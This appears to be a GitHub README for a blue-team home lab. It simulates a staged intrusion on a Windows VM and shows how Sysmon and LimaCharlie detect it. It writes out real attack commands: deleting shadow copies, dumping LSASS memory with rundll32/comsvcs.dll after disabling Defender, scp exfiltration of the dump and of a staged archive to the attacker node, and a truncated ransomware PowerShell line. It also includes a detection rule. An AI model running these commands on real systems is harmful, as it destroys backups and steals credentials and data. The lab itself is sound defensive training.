# 🛡️ Windows Telemetry Hardening & Enterprise Threat Hunting Lab

An end-to-end blue team simulation replicating a multi-stage intrusion lifecycle (Ransomware Inhibition, Advanced Credential Access, Double-Extortion Data Staging, Exfiltration, and Cryptographic Impact). This lab tracks the generation of endpoint events via Microsoft Sysmon and processes real-time telemetry pipelines inside the cloud-native LimaCharlie EDR/SIEM platform, culminating in active Detection Engineering automation.

---

## 📊 Quick Links & Deliverables
*   **Project Presentation Link:** [👉 Click Here to View the Google Slides Presentation](PASTE_YOUR_GOOGLE_SLIDES_SHARE_LINK_HERE)
*   **Target Machine Architecture:** Windows 10 Home (Hardened Endpoint Sensor Node)
*   **Attack Infrastructure:** Kali Linux via Private Hypervisor Network Bridge (`192.168.10.0/24`)
*   **EDR Control Plane:** LimaCharlie Cloud-Native Security Operations Interface

---

## 🏗️ 1. Architecture & Lab Environment Baseline

#### 📝 Architecture Introduction
To analyze modern cyberthreats safely without putting private files at risk, a security engineer must first build an isolated sandbox network. This environment mirrors a corporate architecture, providing standard endpoints for target machines while setting up dedicated telemetry pipes to monitor attack behaviors from a cloud dashboard.

---

### Phase 1: Sandbox Environment Isolation & Defensive Safety Nets
*   **The Analyst's Goal:** Provision an evaluation virtual workstation, sever its digital connection to the home network, and establish a bulletproof safety baseline before welcomes any live malware samples.

#### 📸 Setup Step 1: Account Provisioning inside Cloud SIEM Control Plane

<img width="959" height="309" alt="Screenshot 2026-06-16 222951" src="https://github.com/user-attachments/assets/4ce0dbc7-84e3-4a7d-8d30-c4d9479d8942" />


*   **What the Defender Discovers:** The analyst establishes a dedicated tenant pipeline named `Enterprise-Hunting-Lab` within the cloud-native LimaCharlie platform. This establishes a clean, isolated cloud space ready to accept remote logging data streams from target virtual nodes.

#### 📸 Setup Step 2: Provisioning Analyst Safety Restore Points

<img width="908" height="311" alt="Screenshot 2026-06-16 221114" src="https://github.com/user-attachments/assets/2c706ac7-574e-48ce-894d-18bc93642132" />


*   **Why the Analyst Performs This:** Before deploying logging tools or starting attack traffic, the **analyst** manually forces a local Windows System Restore Point labeled `"BeforeAttack"`. This serves as a vital sandbox safeguard, ensuring that if the impending ransomware simulation completely destroys the operating system, the system state can instantly be rolled back to a clean baseline.

---

## 🔍 2. Deploying Advanced Defensive Telemetry Engines

#### 📝 Logging Deployment Introduction
Default Windows internal logs only save basic events and fail to record stealthy, advanced techniques like memory dumps or custom command parameters. To bridge this visibility gap, the analyst hardens the target endpoint by deploying advanced security tools directly into the operating system.

---

### Phase 2: Telemetry Hardening and Cloud Sensor Integration

#### 📸 Logging Footprint: Local Sysmon Service Deployment

<img width="1024" height="768" alt="VirtualBox_Windows10N_04_06_2026_16_29_39" src="https://github.com/user-attachments/assets/fb260f73-331b-4b78-aa56-42a0cf4d5322" />


*   **What the Defender Discovers:** The analyst installs Microsoft Sysmon using a customized XML rule schema [3.3]. The prompt explicitly registers `SysmonDrv started` and `Sysmon64 started`, meaning an advanced diagnostic sensor is now tracking deep host metrics—like process creation arguments and network handle modifications [3.3].

#### 📸 Logging Footprint: Verifying Local Telemetry Stream

<img width="1920" height="892" alt="VirtualBox_Windows10N_04_06_2026_17_33_15" src="https://github.com/user-attachments/assets/0d72662f-16c7-4255-b3ef-32545ea15f89" />


*   **What the Defender Discovers:** The analyst runs a verification command to audit the active logging pipeline. The output populates with raw data logs detailing running background services, proving that the newly installed Sysmon sensor is actively mapping real-time host events right into the local database partition.

#### 📸 Cloud Telemetry: Deploying the EDR Installation Key

<img width="1409" height="755" alt="Screenshot 2026-06-04 175440" src="https://github.com/user-attachments/assets/41859e2b-2562-4024-9aa8-3a24e2f42ee8" />


*   **What the Defender Discovers:** The cloud SIEM console creates a custom endpoint installation payload. This long key acts as a secure cryptographic passport, ensuring that data moving off the target system can only stream into the analyst's authorized monitoring dashboard.

#### 📸 Cloud Telemetry: Detonating the Cloud Agent Installer

<img width="1911" height="811" alt="Screenshot 2026-06-04 184815" src="https://github.com/user-attachments/assets/ff32144d-5256-41bc-9ae1-3950bdae6f07" />


*   **What the Defender Discovers:** In an elevated administrative command window, the installer script is executed. The prompt fires back with `SUCCESS *** Agent installed successfully!`, indicating that the deep-level cloud hook has integrated with the Windows operating system and is ready to forward live logs out over the network.

#### 📸 Cloud Telemetry: Verification of Online Enterprise Control

<img width="1904" height="894" alt="Screenshot 2026-06-04 234740" src="https://github.com/user-attachments/assets/3fbc037f-7105-4a6b-b83a-23fcf234cf53" />


*   **What the Defender Discovers:** Checking the centralized cloud infrastructure interface, the analyst spots a new active node entry labeled `desktop-bu3cnbb` running a matching Windows logo template. The green checkmark confirms the system is streaming real-time security logs up to the cloud console, indicating that the defensive telemetry baseline is officially active and ready to hunt threat behaviors.

#### 📸 Cloud Telemetry: Configuring the Artifact Collection Pipeline

<img width="1910" height="833" alt="Screenshot 2026-06-05 001022" src="https://github.com/user-attachments/assets/597e3869-4fab-4a3b-9cde-eb501a2d0715" />


*   **What the Defender Discovers:** To ensure absolute visibility, the analyst builds an ingestion route labeled `windows-sysmon-logs`. This explicitly bridges the local endpoint with the cloud SIEM engine, instructing LimaCharlie to continuously pull and retain Windows internal Event Logs for long-term forensic study.



---

## 🛑 2. Intrusion Simulation & Forensic Timeline Analysis




### Use Case 1: Inhibit System Recovery (Ransomware Pre-Cursor)

*   **MITRE ATT&CK Mapping:** T1490 — Inhibit System Recovery

#### 📝 Use Case Introduction
Before a ransomware attacker locks up a target computer with encryption, they face a major obstacle: automatic system backups. Modern operating systems frequently save hidden snapshots of your files (called Volume Shadow Copies) so that if something breaks, you can easily roll the system back in time and restore your clean data.

If an attacker leaves these backups intact, the victim company will simply restore their machines for free instead of paying a ransom. Therefore, the threat actor's very first step is to hunt down and completely destroy every backup copy on the hard drive. By wiping out the system's safety nets, the attacker forces the victim into a corner where they have no choice but to pay the ransom to get their operations back online.

---

#### 📸 Step 1: Network Reconnaissance (Finding the Target)

<img width="887" height="434" alt="Screenshot 2026-06-15 140418" src="https://github.com/user-attachments/assets/e9987c1d-539f-4dc0-9dce-7256e1aeff6b" />


**The Action:** The attacker uses a network scanning tool called Nmap to scan the network. This allows them to discover the target Windows computer and find out its true name (`DESKTOP-BU3CNBB`) and open doors without needing to log in.

---

#### 📸 Step 2: Remote Access (Gaining a Footprint)

<img width="935" height="434" alt="Screenshot 2026-06-15 142011" src="https://github.com/user-attachments/assets/66f0fe9c-beac-4944-b368-59fa34e7c59a" />


**The Action:** Once the attacker knows the computer is active on the network, they use an encrypted SSH connection to log into the machine remotely over Port 22 using stolen or discovered credentials. The attacker now has an active, remote command line connection to control the victim's system.

---


#### 📸 Step 2.5: Attacker Reconnaissance (Mapping the Backups)

<img width="978" height="648" alt="VirtualBox_Windows10N_10_06_2026_22_15_27" src="https://github.com/user-attachments/assets/f85a1c66-5cf5-4782-912a-dd739a6b17dc" />


**Command:** `vssadmin list shadows`
*   **What it does in simple terms:** Before running any destructive commands, the **attacker** runs this utility to see if the victim has any automatic backup snapshots saved on the hard drive. Finding an active backup container tells the attacker that they must wipe out these safety nets in the next step so the company cannot restore their files for free [3.3].

---

#### 📸 Step 3: Remote Access & Account Verification

<img width="950" height="434" alt="Screenshot 2026-06-15 001959" src="https://github.com/user-attachments/assets/9d1dacf6-1069-4443-988c-bea6a2aa4a1a" />


**Command 1:** `whoami`
*   **What it does in simple terms:** This command asks the computer, *"Who am I logged in as right now?"* The system responds with `desktop-bu3cnbb\target-pc2`, confirming to the remote attacker that their login worked and that they have administrative control over the machine.

**Command 2:** `vssadmin delete shadows /all /quiet`
*   **What it does in simple terms:** This command tells the Windows operating system to locate every single automatic file backup snapshot on the drive and delete them all immediately. The `/quiet` flag ensures that the computer deletes them silently in the background without popping up any warning messages for the user.




### Use Case 2: High-Privilege Credential Access (LSASS Memory Dump)

*   **MITRE ATT&CK Mapping:** T1003.001 — OS Credential Dumping: LSASS Memory

#### 📝 Use Case Introduction
When an attacker gains initial access to a single computer, they are usually trapped inside a standard user account with limited permissions. To take over the entire corporate network, the attacker needs administrative passwords to log into other systems [3.3].

In this phase, the attacker targets a core Windows security program called **LSASS** (`lsass.exe`), which manages active user sessions and temporarily holds encrypted login keys inside the computer's running memory (RAM) [3.3]. By copying everything out of this program's memory space and saving it into a hidden file, the attacker creates a permanent snapshot of the system's active passwords [3.3]. This file can then be stolen and unlocked offline, giving the threat actor the administrative credentials needed to compromise the rest of the enterprise network [3.3].

---


#### 📸 Step 1: Process Reconnaissance & The Antivirus Roadblock

<img width="958" height="427" alt="Screenshot 2026-06-15 002545" src="https://github.com/user-attachments/assets/653cc153-e20a-4f6f-8f8c-e00f140b493f" />


**Command 1:** `tasklist /fi "imagename eq lsass.exe"`

*   **What it does in simple terms:** This command searches the computer to find the exact tracking number (called a Process ID) of the Windows password vault (`lsass.exe`) [3.3]. The attacker needs this specific number (`604`) to point their attack tools at it.

**Command 2:** `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 604 C:\Users\Target-PC2\Documents\lsass.dmp full`
*   **What it does in simple terms:** This command tells the computer to take a complete snapshot of that password vault's memory and save it as a file named `lsass.dmp` [3.3]. 
*   **The Result:** Because the computer's security guards were still turned on, Windows Defender blocked the command immediately and shouted **"Access is denied,"** saving the passwords from being copied.

---

#### 📸 Step 2: Bypassing the Protection (Silent Execution)

<img width="959" height="430" alt="Screenshot 2026-06-15 005111" src="https://github.com/user-attachments/assets/1ff82602-bb74-4008-a2c3-304051fb6671" />


**The Action:** The attacker opens the Windows settings menu, temporarily turns off the real-time security guards, and inputs the exact same `rundll32.exe` command a second time.
*   **What it does in simple terms:** With the security guards paused, the command runs perfectly. It makes no noise, displays no error messages, and returns straight to a clean prompt line. This means the computer silently allowed the memory snapshot to take place.

---

#### 📸 Step 3: Verifying the Stolen Credential File

<img width="956" height="434" alt="Screenshot 2026-06-15 005215" src="https://github.com/user-attachments/assets/d9772924-de25-48eb-9739-c950de8a75bd" />


**Command 3:** `dir C:\Users\Target-PC2\Documents\lsass.dmp`
*   **What it does in simple terms:** This command looks inside the Documents folder to confirm that the hidden file was actually generated on the hard drive.
*   **The Proof:** The text on the screen explicitly proves that a permanent **55,848,099-byte file** was created. The attacker successfully copied a raw snapshot of the active system passwords onto the local disk.


---

#### 📸 Step 4: Exfiltrating the Credential Snapshot to the Attacker Node

<img width="917" height="433" alt="Screenshot 2026-06-15 145922" src="https://github.com/user-attachments/assets/d470da50-bf14-48ab-841c-239f9fd1ed02" />


**Command 4:** `scp Target-PC2@192.168.10.9:Documents/lsass.dmp ~/Desktop/`
*   **What it does in simple terms:** Run from a local terminal on the attacker's Kali Linux machine, this command reaches out across the network to the victim computer using Secure Copy Protocol (SCP). It downloads the 55MB `lsass.dmp` password snapshot file directly onto the attacker's own desktop.
*   **The Final Proof:** Running the local file listing check (`ls -la`) on Kali confirms the file arrived completely with its size intact (**55,848,099 bytes**). The attacker now has a permanent copy of the victim's active memory vault completely in their hands, ready to be cracked offline to harvest administrative network passwords.






### Use Case 3: Double-Extortion Collection, Data Staging, and Exfiltration

*   **MITRE ATT&CK Mapping:** T1074.001 — Data Staging: Local Data Staging & T1048 — Exfiltration Over Alternative Protocol

#### 📝 Use Case Introduction
In modern cyberattacks, threat actors practice **Double Extortion**. They steal a copy of the company's confidential documents *before* locking up the systems. If the company refuses to pay the ransom because they have offline backups, the attacker threatens to leak their secrets on the dark web instead.

To speed up the theft and avoid raising alarms, the attacker does not download files one by one. They gather everything into a temporary folder, archive it into a single `.zip` file, download it over a network tunnel, and then delete the local file to clear their tracks.

---

#### 📸 Step 1: Automated Data Staging (Packaging the Secrets)

<img width="959" height="439" alt="Screenshot 2026-06-15 170459" src="https://github.com/user-attachments/assets/4fef839a-6652-48c3-9520-0bebd6e56b84" />


**Command 1:** `powershell Compress-Archive -Path C:\CorporateData -DestinationPath C:\Windows\Temp\sensitive_exfil.zip -Force`
*   **What it does in simple terms:** This command packages up the entire corporate data folder containing private files and compresses it into a hidden archive file called `sensitive_exfil.zip` inside the Windows Temp directory.

---

#### 📸 Step 2: Data Exfiltration (Stealing the Package)

<img width="950" height="436" alt="Screenshot 2026-06-15 170813" src="https://github.com/user-attachments/assets/70a9d1be-4852-408d-9bdd-32655e96b80e" />


**Command 2:** `scp Target-PC2@192.168.10.9:../../Windows/Temp/sensitive_exfil.zip ~/Desktop/`
*   **What it does in simple terms:** Run from the attacker's local Kali Linux machine, this command downloads the hidden zip package across the network tunnel and saves it directly onto the attacker's desktop background.

---

#### 📸 Step 3: Verifying the Stolen Data Collection

<img width="938" height="431" alt="Screenshot 2026-06-15 171315" src="https://github.com/user-attachments/assets/4f6d8a2a-9817-41de-86cf-548bed343562" />


**Command 3:** `ls -la`
*   **What it does in simple terms:** The attacker inspects their local folder workspace to ensure the stolen corporate records arrived successfully and are completely in their possession.

---

#### 📸 Step 4: Defense Evasion (Covering Attack Footprints)

<img width="959" height="434" alt="Screenshot 2026-06-15 171932" src="https://github.com/user-attachments/assets/574195da-f5ed-4b6c-97d9-1d368fd801a0" />


**Command 4:** `del C:\Windows\Temp\sensitive_exfil.zip`
*   **What it does in simple terms:** Now that the attacker has stolen the files, they run a delete command to wipe the `.zip` archive off the victim's hard drive. This covers their tracks and removes any obvious signs of data theft before they trigger the ransomware.





### Use Case 4: Action on Objectives (Cryptographic Ransomware Impact)

*   **MITRE ATT&CK Mapping:** T1486 — Data Encrypted for Impact

#### 📝 Use Case Introduction
Once system backups are destroyed, passwords are stolen, and confidential files are safely copied to the attacker's machine, the intrusion lifecycle reaches its final, devastating stage: **Data Encryption**. 

The attacker detonates the ransomware payload to scramble the victim's data using custom code loops. This locks up every corporate document on the disk, appends a unreadable file extension, and drops a high-visibility extortion letter on the desktop demanding payment.

---

#### 📸 Step 1: Ransomware Detonation & Execution

<img width="1920" height="892" alt="VirtualBox_kali-linux-2025 4-virtualbox-amd64_12_06_2026_01_50_13" src="https://github.com/user-attachments/assets/9ddf4ea3-ee0b-45c6-80a0-2d91db52caef" />


**Command 1:** `powershell.exe -c "Get-ChildItem C:\CorporateData\* ..."`
*   **What it does in simple terms:** This script searches the entire corporate data folder, reads every text and spreadsheet file, scrambles their contents into unreadable code text blocks, renames them with a `.locked` file extension, and deletes the original readable copies. 
*   **The Final Impact:** At the exact same time, the script generates a new text file named `READ_ME_RANSOM.txt` directly onto the victim's desktop, warning them that their company files are compromised and demanding a ransom payment to unlock them.


---




## 🔍 2. Threat Hunting & SIEM Telemetry Analysis

#### 📝 Threat Hunting Introduction
An entry-level analyst simply looks to see if a computer screen has a virus warning on it. A professional enterprise analyst uses a centralized cloud platform like **LimaCharlie** combined with local Windows logs to hunt for hidden digital footprints. 

Below is the forensic investigation trail. It tells the story of how the defender connects the local system clues to the cloud alerts to unmask the attacker's entire strategy.

---

### 🛡️ Phase 1 Tracking: Threat Hunting the Backup Deletion
*   **The Attacker's Action:** The hacker executed `vssadmin delete shadows /all /quiet` to destroy all automatic system backups.

#### 📸 Local Footprint: Windows Sysmon Event ID 1 (Process Creation)

<img width="1920" height="892" alt="VirtualBox_Windows10N_15_06_2026_23_53_33" src="https://github.com/user-attachments/assets/e34df429-5fb8-497e-9099-ec6c0a5d076f" />


*   **What the Defender Discovers:** By finding this local log, the defender discovers the attacker's primary motive: **Inhibiting System Recovery**. The defender understands that a hacker is on the network and is intentionally destroying the system's safety nets to make sure the company cannot restore its files for free. 


#### 📸 Cloud Telemetry: SIEM Consolidated Live Feed & Timeline Analysis

<img width="956" height="313" alt="Screenshot 2026-06-16 173144" src="https://github.com/user-attachments/assets/ad9ec8d8-33ba-4d42-a541-0c7d30fc667e" />


*   **The Attack Being Carried Out:** The threat actor is executing an **Inhibit System Recovery attack (MITRE T1490)**. They are using an administrative command tool (`vssadmin.exe`) to completely wipe out all hidden file backup snapshots on the hard drive so the victim cannot easily roll back or restore their files for free.

*   **What the Defender Discovers (Live Feed - Left side):** The real-time stream catches the attack text the exact millisecond it runs. The defender reads the raw `COMMAND_LINE` showing the specific arguments used: `delete shadows /all /quiet`. By looking at the background process path, the defender unmasks that the local command prompt (`cmd.exe`) was spawned by the remote OpenSSH service (`sshd.exe`), proving that an outside hacker has successfully logged into the system.

*   **What the Defender Discovers (Timeline - Right side):** Shifting to the historical log database, the defender tracks down the permanent record of the event. The timeline isolates the exact process creation event at `20:53:19` and displays the full `CommandLine` details inside the JSON event data box. This confirms to the defender that the cloud platform has locked the forensic footprint permanently in history, allowing the security team to build an accurate timeline of the breach even if the attacker closes their connection.


---

### 🛡️ Phase 2 Tracking: Threat Hunting the Memory Dump
*   **The Attacker's Action:** The hacker disabled the antivirus guards and ran a script tool (`rundll32.exe`) to clone the computer's password storage service (`lsass.exe`) into a file.

#### 📸 Local Footprint: Windows Sysmon Event ID 1 (Process Creation)

<img width="1920" height="892" alt="VirtualBox_Windows10N_11_06_2026_17_53_14" src="https://github.com/user-attachments/assets/d1e78541-688f-4cc8-a951-7d335201cc97" />


*   **What the Defender Discovers:** The defender finds the second, successful attack execution on the hard drive. By reading the script parameters, the defender understands that the hacker used an advanced "Living off the Land" trick (using a trusted built-in Windows tool to run a malicious memory dump) to slip past basic file filters undetected.

#### 📸 Local Footprint: Windows Sysmon Event ID 10 (Process Access Handle)

<img width="1920" height="892" alt="VirtualBox_Windows10N_11_06_2026_18_05_39" src="https://github.com/user-attachments/assets/ba3dc295-b659-49d9-883b-d8e156efce0c" />


*   **What the Defender Discovers:** This log acts as the **ultimate proof of credential theft**. The defender sees that an outside application requested a deep handle to look inside the password storage vault (`lsass.exe`). The defender instantly understands that the attacker has successfully copied the system's active passwords and security keys.


#### 📸 Cloud Telemetry: Consolidated Live Feed & Timeline Analysis

<img width="958" height="313" alt="Screenshot 2026-06-16 163234" src="https://github.com/user-attachments/assets/c0d96768-96d2-4abc-a5ac-b2f8650901b8" />


*   **The Attack Being Carried Out:** The threat actor is attempting an **OS Credential Dumping attack (MITRE T1003.001)**. They are trying to steal the company's administrative network passwords by forcing a trusted built-in Windows program (`rundll32.exe`) to take a hidden snapshot of the system's running password vault memory (`lsass.exe`).

*   **What the Defender Discovers (Live Feed - Left side):** The real-time stream catches the attack text as it happens. The defender reads the raw `CommandLine` showing that the memory copy script completed successfully. Crucially, the log flags **`"IntegrityLevel": "High"`**, which tells the defender that the hacker successfully gained elevated administrator permissions to read protected system memory boundaries.

*   **What the Defender Discovers (Timeline - Right side):** Shifting to the historical log database, the defender tracks down the exact result of the execution. The timeline unmasks that the command prompt was spawned by an underlying script tool (`powershell.exe`) and exposes the final output path: `C:\Users\Target-PC2\Documents\lsass.dmp`. The defender now knows the exact file location holding the stolen company passwords and can step in to delete the file and force an immediate password reset across the network.


*   **What the Defender Discovers (Timeline - Right side):** Shifting to the historical log database, the defender tracks down the exact result of the execution. The timeline unmasks that the command prompt was spawned by an underlying script tool (`powershell.exe`) and exposes the final output path: `C:\Users\Target-PC2\Documents\lsass.dmp`. Even though the attacker later executes a delete command to cover their tracks, this forensic footprint tells the defender exactly which memory vault was compromised. This allows the security team to verify the file's destruction and immediately force a password reset across the corporate network to make the stolen data useless. In a situation where the attacker didn't delete the file, as a result of the finding from the above diagram, the defender now knows the exact file location holding the stolen company passwords and can step in to delete the file.



---

### 🛡️ Phase 3 Tracking: Threat Hunting the Data Leak (Exfiltration)
*   **The Attacker's Action:** The hacker packed up corporate text documents into a `.zip` archive and used a secure file transfer tool (`scp`) to copy the file over the network to their Kali Linux machine.

#### 📸 Local Footprint: Windows Sysmon Event ID 11 (File Creation)

<img width="1920" height="892" alt="VirtualBox_Windows10N_12_06_2026_01_03_20" src="https://github.com/user-attachments/assets/f794bc34-2fe6-4080-9e2c-f415c7245bc3" />


*   **What the Defender Discovers:** The defender finds the **Data Staging** phase. By locating the creation of `sensitive_exfil.zip` inside the system's temporary directory (`C:\Windows\Temp\`), the defender understands that the attacker was actively bundling private company databases together into a single package so they could steal them easily in one download.

#### 📸 Local Footprint: Windows Sysmon Event ID 3 (Network Connection)

<img width="1920" height="892" alt="VirtualBox_Windows10N_11_06_2026_03_00_06" src="https://github.com/user-attachments/assets/a4687d36-4674-413e-9786-e6dc07dbe5c6" />


*   **What the Defender Discovers:** This log captures the exact moment the corporate data transfer took place across network boundaries. The defender discovers an active **Event ID 3 (Network Connection)** coming from the OpenSSH background program (`sshd.exe`). 

Even though the raw number 22 is translated by the system, the program name tells the defender that an external network address (`192.168.10.250`) is using an active Port 22 remote tunnel to pull files off the machine. The defender instantly recognizes this as a **Data Exfiltration breach** and flags the hacker's exact network identity.


#### 📸 Cloud Telemetry: Live Feed Network Pipe Logging

<img width="1280" height="644" alt="Data exfiltration (2)" src="https://github.com/user-attachments/assets/5d1a8b6b-2afe-454e-aa14-58168c9aec83" />


*   **What the Defender Discovers:** The cloud console highlights the live outbound traffic flow. The defender sees the network pipe transferring data over Port 22, understanding that the attacker is leveraging an authorized network shell connection to hide their unauthorized data theft behavior.

#### 📸 Cloud Telemetry: Consolidated Session Analysis

<img width="1280" height="625" alt="Data exfiltration (1)" src="https://github.com/user-attachments/assets/5f2116db-4575-424d-b104-3a68e8558c6d" />

*   **What the Defender Discovers:** The defender uses this cloud network view to catch an active **Data Exfiltration breach** in progress. By filtering the centralized logs, the defender flags a critical `NETWORK_CONNECTIONS` event linked directly to the system's secure copy file utility (`sshd.exe`).

The defender instantly understands that an outside attacker is actively using the machine's secure network doorways to copy files off the computer. This visual proof allows the security team to identify the exact unauthorized application used to siphon information and proves that confidential data has been stolen over the wire.


---

### 🛡️ Phase 4 Tracking: Threat Hunting the Ransomware Encryption
*   **The Attacker's Action:** The hacker ran a malicious script loop that encrypted company folders with a `.locked` extension and dropped a ransom note file onto the desktop background.

#### 📸 Local Footprint: Windows System Impact View (GUI)

<img width="1920" height="892" alt="VirtualBox_Windows10N_12_06_2026_01_54_34" src="https://github.com/user-attachments/assets/f2f8bfa7-5b1b-4712-87a0-acd4b11bc38a" />


*   **What the Defender Discovers:** The defender witnesses the **Action on Objectives** phase. Looking at the screen, the defender understands the final impact of the attack: all primary company documents have been destroyed and locked with a `.locked` extension, and the enterprise is now facing a live extortion demand for 1 BTC.

#### 📸 Local Footprint: Windows Sysmon Event ID 11 (Ransom File Drop)

<img width="1920" height="892" alt="VirtualBox_Windows10N_12_06_2026_01_59_56" src="https://github.com/user-attachments/assets/a2e472eb-03da-4326-a077-72f215615e17" />


*   **What the Defender Discovers:** The local log tracks the drop of the extortion demand. The defender discovers that a PowerShell script explicitly wrote a file named `READ_ME_RANSOM.txt` directly onto the user's desktop profile path, confirming that a ransomware payload has been detonated.



#### 📸 Cloud Telemetry: Consolidated Live Feed & Timeline Analysis

<img width="959" height="312" alt="Screenshot 2026-06-16 212602" src="https://github.com/user-attachments/assets/56169083-21e2-418a-a894-097d6b7e10ae" />


*   **The Attack Being Carried Out:** The threat actor is executing the final, destructive phase of a **Data Encrypted for Impact attack (MITRE T1486)**. They are using an automated PowerShell script loop to scramble corporate databases and drop an extortion note onto the user interface.

*   **What the Defender Discovers (Live Feed - Left side):** The real-time stream catches the file modification wave instantly. The defender expands the raw event payload and unmasks a PowerShell thread writing a file named `READ_ME_RANSOM.txt` directly onto the victim's desktop folder profile. The defender immediately recognizes this as an active ransom demand.

*   **What the Defender Discovers (Timeline - Right side):** Shifting to the historical log database, the defender runs a query search for the keyword `ransom` to verify the attack's reach. The timeline console isolates the exact event and displays the full data box. This confirms to the security team that the ransomware script executed successfully, giving the analyst the precise process data needed to begin system isolation and incident response procedures.


---

## 🛠️ 3. Proactive Detection Engineering & Automated Defense

#### 📝 What Led to This Defense Rule (The Analyst's Response)
After reviewing the threat hunting tracking data from the previous phases, the analyst identifies a critical choke point in the attack: the hacker relies on a script loop to write ransom notes directly onto user desktops. Instead of manually monitoring logs after files are already corrupted, the analyst decides to engineer an **Automated Defense System** to intercept and block the attack in real-time.

---

#### 📸 EDR Engineering Control Profile: `Ransom_Note_Mitigation_Rule`

<img width="1280" height="630" alt="WhatsApp Image 2026-06-13 at 2 17 04 AM" src="https://github.com/user-attachments/assets/090a38d1-e69a-41d0-8002-b4d708f6f5cc" />


*   **The Design Logic (Detect Section):** The rule watches the endpoint in real-time for any `FILE_CREATE` event. It utilizes a regular expression pattern (`re: .*\\Desktop\\.*RANSOM.*\.txt$`) to monitor user profiles. If any program attempts to drop a text file containing the word "RANSOM" onto any desktop interface across the enterprise network, the detection filter trips instantly.

*   **The Containment Mechanism (Response Section):** Once tripped, the system triggers an immediate multi-action mitigation array. 
    1. **`action: report`**: It drops a high-priority alert named `CRITICAL_RANSOMWARE_DETONATION_ATTEMPT` straight into the SOC dashboard queue.
    2. **`command: history_dump`**: It saves volatile log data from the computer's recent memory for forensic investigation.
    3. **`command: deny_tree <<routing/parent>>`**: This is the EDR kill switch. It instantly terminates the parent program running the ransomware script (the hacker's remote network shell thread). 

*   **The Final Outcome:** As shown by the active **`Enabled`** status on the screen, the rule is fully armed. It lowers the system's Mean Time to Remediate (MTTR) straight down to milliseconds, freezing the ransomware mid-execution and completely neutralizing the threat before a single additional corporate folder can be encrypted.



